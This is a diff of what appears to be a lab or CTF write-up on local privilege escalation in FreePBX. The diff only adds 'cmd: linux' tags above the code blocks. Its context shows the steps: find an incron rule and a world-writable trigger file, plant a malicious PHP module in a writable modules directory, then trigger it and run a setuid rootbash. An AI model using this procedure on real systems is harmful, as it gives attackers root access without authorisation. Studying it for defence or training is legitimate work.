@@ -31,6 +31,7 @@ then the attacker controls what code runs as root.
 
 ### 1. Identify the incron rule
 
+<!-- cmd: linux -->
 ```bash
 cat /etc/incron.d/*
 ```
@@ -41,6 +42,7 @@ cat /etc/incron.d/*
 
 ### 2. Confirm the trigger file is world-writable
 
+<!-- cmd: linux -->
 ```bash
 ls -la /usr/local/asterisk/ha_trigger
 # -rwxrwxrwx. 1 asterisk asterisk 0 Apr 15 2021 ha_trigger
@@ -48,6 +50,7 @@ ls -la /usr/local/asterisk/ha_trigger
 
 ### 3. Read the triggered script to find the include path
 
+<!-- cmd: linux -->
 ```bash
 cat /usr/sbin/sysadmin_ha
 ```
@@ -65,6 +68,7 @@ if (file_exists($i)) {
 
 ### 4. Confirm the modules directory is writable
 
+<!-- cmd: linux -->
 ```bash
 ls -la /var/www/html/admin/modules/
 # drwxrwxr-x. asterisk asterisk ...
@@ -72,6 +76,7 @@ ls -la /var/www/html/admin/modules/
 
 ### 5. Plant the malicious PHP module
 
+<!-- cmd: linux -->
 ```bash
 mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
 
@@ -87,6 +92,7 @@ PHP
 
 ### 6. Trigger the event and escalate
 
+<!-- cmd: linux -->
 ```bash
 echo "pwn" > /usr/local/asterisk/ha_trigger
 sleep 3 && /tmp/rootbash -p
